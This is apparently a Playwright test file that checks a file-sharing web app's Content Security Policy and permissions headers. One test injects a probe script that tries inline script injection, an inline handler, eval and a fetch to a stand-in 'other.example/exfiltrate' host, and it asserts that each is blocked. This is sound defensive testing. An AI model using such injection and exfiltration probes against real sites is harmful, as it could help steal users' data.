import { test, expect } from "@playwright/test";
import QRCode from "qrcode";

const id = "01234567-89ab-cdef-0123-456789abcdef";
const key = "A".repeat(43);

test.beforeEach(async ({ page }) => {
  await page.route("**/api/v1/auth/me", (route) =>
    route.fulfill({ json: { user: { id: "csp-user", username: "csp", role: "user" } } }),
  );
  await page.route("**/api/v1/auth/resources**", (route) =>
    route.fulfill({ json: { transfers: [], slots: [] } }),
  );
  await page.route("**/api/v1/config", (route) =>
    route.fulfill({ json: { max_file_size: 26214400 } }),
  );
  await page.addInitScript(() => {
    localStorage.setItem("psst.theme", "dark");
    delete (window as any).BarcodeDetector;
    navigator.mediaDevices.getUserMedia = async () => {
      throw new DOMException("Denied", "NotAllowedError");
    };
    (window as any).policyViolations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      (window as any).policyViolations.push(event.effectiveDirective);
    });
  });
});

test("production policy allows saved theme, compiled UI, local worker decoding and explicit external navigation", async ({
  page,
}) => {
  const response = await page.goto("/?view=scan");
  expect(response?.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
  expect(response?.headers()["permissions-policy"]).toContain("camera=(self)");
  await expect(page.locator("html")).toHaveAttribute("data-theme", "dark");
  await expect(page.getByRole("alert")).toContainText("Camera access was denied");
  const destination = `https://other.example/d/${id}#${key}`;
  await page.getByLabel("Choose QR image", { exact: true }).setInputFiles({
    name: "qr.png",
    mimeType: "image/png",
    buffer: await QRCode.toBuffer(destination, { width: 600 }),
  });
  await expect(page.getByRole("button", { name: "Open download link" })).toBeVisible();
  expect(await page.evaluate(() => (window as any).policyViolations)).toEqual([]);
  await page.route("https://other.example/**", (route) =>
    route.fulfill({ body: "External destination" }),
  );
  await page.getByRole("button", { name: "Open download link" }).click();
  await expect(page).toHaveURL(destination);
});

test("production policy blocks inline scripts, eval, inline handlers and cross-origin connections", async ({
  page,
}) => {
  await page.goto("/");
  await expect(page.getByRole("navigation", { name: "Account navigation" })).toBeVisible();
  // Run eval from a normal same-origin script. DevTools page.evaluate itself
  // bypasses the eval restriction and cannot establish this security property.
  await page.route("**/__csp_probe__.js", (route) =>
    route.fulfill({
      contentType: "application/javascript",
      body: `(async () => {
      const script = document.createElement("script");
      script.textContent = "window.injected = true";
      document.body.append(script);
      const button = document.createElement("button");
      button.setAttribute("onclick", "window.injected = true");
      document.body.append(button); button.click();
      let evalBlocked = false, fetchBlocked = false;
      try { window.eval("window.injected = true"); } catch { evalBlocked = true; }
      try { await fetch("https://other.example/exfiltrate"); } catch { fetchBlocked = true; }
      window.probeResults = { injected: Boolean(window.injected), evalBlocked, fetchBlocked };
    })();`,
    }),
  );
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.src = "/__csp_probe__.js";
    document.body.append(script);
  });
  await expect
    .poll(() => page.evaluate(() => (window as any).probeResults))
    .toEqual({
      injected: false,
      evalBlocked: true,
      fetchBlocked: true,
    });
  await expect
    .poll(() => page.evaluate(() => (window as any).policyViolations))
    .toEqual(
      expect.arrayContaining(["script-src-elem", "script-src-attr", "script-src", "connect-src"]),
    );
});

test("public documents deny camera and keep blob download handoff working", async ({ page }) => {
  const response = await page.goto(`/d/${id}#${key}`);
  expect(response?.headers()["permissions-policy"]).toContain("camera=()");
  const download = page.waitForEvent("download");
  await page.evaluate(() => {
    const url = URL.createObjectURL(new Blob(["policy download"], { type: "text/plain" }));
    const link = document.createElement("a");
    link.href = url;
    link.download = "policy.txt";
    document.body.append(link);
    link.click();
    link.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
  expect((await download).suggestedFilename()).toBe("policy.txt");
  expect(await page.evaluate(() => (window as any).policyViolations)).toEqual([]);
});
